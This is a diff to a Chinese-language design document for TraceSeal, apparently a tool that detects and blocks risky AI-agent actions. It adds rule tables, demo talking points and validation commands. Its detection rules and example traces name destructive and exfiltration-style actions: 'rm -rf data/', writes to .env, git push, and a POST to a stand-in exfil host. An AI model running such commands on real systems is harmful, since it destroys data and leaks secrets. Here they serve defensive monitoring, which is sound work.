@@ -35,7 +35,7 @@
   "risk_level": "high",
   "action": "warn",
   "reason": "writing environment files can corrupt secrets/configuration",
-  "suggested_policy": "deny file.write \".env*\""
+  "suggested_policy": "deny file_write \".env*\""
 }
 ```
 
@@ -43,16 +43,19 @@
 
 ### 3.1 dangerous_delete
 
-- 匹配：`rm -rf`、`rm -fr`、`rmdir /s /q`
-- 当前实现：`policy.rules.is_rm_rf()` + `rm_targets()`
-- 行为：Windows/macOS/Linux demo 中由 SDK 模拟删除并记录 diff
-- block 模式：返回 126 / 抛出 `CalledProcessError`
+| 字段 | 值 |
+|---|---|
+| 触发 | `rm -rf`、`rm -fr`、`rmdir /s /q` |
+| 当前实现 | `policy.rules.is_rm_rf()` + `rm_targets()` |
+| 风险说明 | 递归强制删除会不可逆地销毁目录树，Agent 可能误删数据目录或源码目录。 |
+| warn 模式 | 执行/模拟执行并记录 critical 事件。 |
+| block 模式 | 返回 126 / 抛出 `CalledProcessError`，不执行删除。 |
 
 Explain 示例：
 
 ```text
 首次有害工具调用:
-[evt_0003] shell: rm -rf data/
+[evt_0003] Shell 命令: rm -rf data/
 
 原因:
 - 请求递归强制删除: data/
@@ -63,18 +66,23 @@ Explain 示例：
 deny shell "rm -rf data/**"
 ```
 
+演示话术：Agent 本来只是整理文件，却删掉了整个 `data/`，TraceSeal 能精确指出第一步有害调用，并给出下一次可阻断的规则。
+
 ### 3.2 env_write
 
-- 匹配：`.env`、`.env.*`
-- 当前实现：`policy.rules.evaluate_file_write()`
-- 行为：记录 `file.write`，标记 high
-- block 模式：在写入前阻断，避免敏感配置被创建/覆盖
+| 字段 | 值 |
+|---|---|
+| 触发 | 写入 `.env`、`.env.*` |
+| 当前实现 | `policy.rules.evaluate_file_write()` |
+| 风险说明 | `.env` 通常包含 API Key、数据库密码、Token；被 Agent 创建、覆盖或打印都需要审计。 |
+| warn 模式 | 记录 `file.write`，标记 high。 |
+| block 模式 | 在写入前阻断，避免敏感配置被创建/覆盖。 |
 
 Explain 示例：
 
 ```text
 首次有害工具调用:
-[evt_0002] file.write: .env
+[evt_0002] 文件写入: .env
 
 原因:
 - 敏感环境配置文件被修改: .env
@@ -85,18 +93,23 @@ Explain 示例：
 deny file_write ".env*"
 ```
 
+演示话术：这个案例使用 `sk-demo-secret` 等演示占位符，不包含真实密钥；重点是证明 TraceSeal 能发现敏感配置文件写入。
+
 ### 3.3 git_push
 
-- 匹配：`git push ...`
-- 当前实现：`policy.rules.is_git_push()`
-- 行为：SDK 离线模拟，不执行真实 push，不接触远端
-- block 模式：模拟阻断并记录 `status=blocked`
+| 字段 | 值 |
+|---|---|
+| 触发 | `git push ...` |
+| 当前实现 | `policy.rules.is_git_push()` |
+| 风险说明 | `git push` 会把本地状态发布到远端；即使不是 `--force`，也应要求人工确认。 |
+| warn 模式 | SDK 离线模拟，不执行真实 push，不接触远端。 |
+| block 模式 | 模拟阻断并记录 `status=blocked`。 |
 
 Explain 示例：
 
 ```text
 首次有害工具调用:
-[evt_0002] shell: git push origin main
+[evt_0002] Shell 命令: git push origin main
 
 原因:
 - 请求远程 git push
@@ -106,18 +119,23 @@ Explain 示例：
 require_approval git "push"
 ```
 
+演示话术：前置的修改、测试、提交可能都是正常操作，但直接 `git push origin main` 跨越了本地工作区边界，需要至少 `require_approval`。
+
 ### 3.4 suspicious_http_post
 
-- 匹配：HTTP `POST`
-- 当前实现：`policy.rules.evaluate_http_request()`
-- 行为：`bad_agent_http.py` 默认启用 `TRACESEAL_OFFLINE_HTTP=1`，SDK 记录事件并返回 fake response，不访问真实外网
-- block 模式：写入 `status=blocked` 并抛出 `PermissionError`
+| 字段 | 值 |
+|---|---|
+| 触发 | HTTP `POST` / `PUT` 请求，尤其是外部 URL 或携带 secret-like 字段。 |
+| 当前实现 | `policy.rules.evaluate_http_request()` |
+| 风险说明 | HTTP POST 可能把源码、`.env` 或 token 外传。 |
+| warn 模式 | 记录 method、url、status 或异常摘要。 |
+| block 模式 | 写入 `status=blocked` 并抛出 `PermissionError`。 |
 
 Explain 示例：
 
 ```text
 首次有害工具调用:
-[evt_0002] http: POST https://exfil.example.invalid/collect
+[evt_0002] HTTP 请求: POST https://exfil.example.invalid/collect
 
 原因:
 - 可疑的出站 HTTP POST: POST https://exfil.example.invalid/collect
@@ -127,7 +145,25 @@ Explain 示例：
 deny http "POST https://exfil.example.invalid/collect"
 ```
 
-## 4. Policy 模式
+演示话术：当前 demo 默认 `TRACESEAL_OFFLINE_HTTP=1`，因此不会真实访问危险 URL，但事件、风险和建议规则都会完整产生。
+
+## 4. 规则验证命令
+
+```powershell
+python -m traceseal run python examples/bad_agent_delete.py
+python -m traceseal explain runs/latest
+
+python -m traceseal run python examples/bad_agent_env.py
+python -m traceseal explain runs/latest
+
+python -m traceseal run python examples/bad_agent_git.py
+python -m traceseal explain runs/latest
+
+python -m traceseal run python examples/bad_agent_http.py
+python -m traceseal explain runs/latest
+```
+
+## 5. Policy 模式
 
 | 模式 | 配置 | 行为 |
 |---|---|---|
@@ -139,7 +175,7 @@ $env:TRACESEAL_POLICY_MODE = "block"
 python -m traceseal run python examples/bad_agent_env.py
 ```
 
-## 5. 后续 policy.yaml DSL 方向
+## 6. 后续 policy.yaml DSL 方向
 
 当前 `policy.yaml` 未实现。下一阶段可以把 JSON + Python matcher 升级为：
 
@@ -154,4 +190,4 @@ rules:
     action: deny
 ```
 
-后续增强：路径 glob、域名白名单、force push 细分、审批模式、规则热加载。
+后续增强：路径 glob、域名白名单、force push 细分、审批模式、规则热加载、环境感知规则（development / CI / production）。
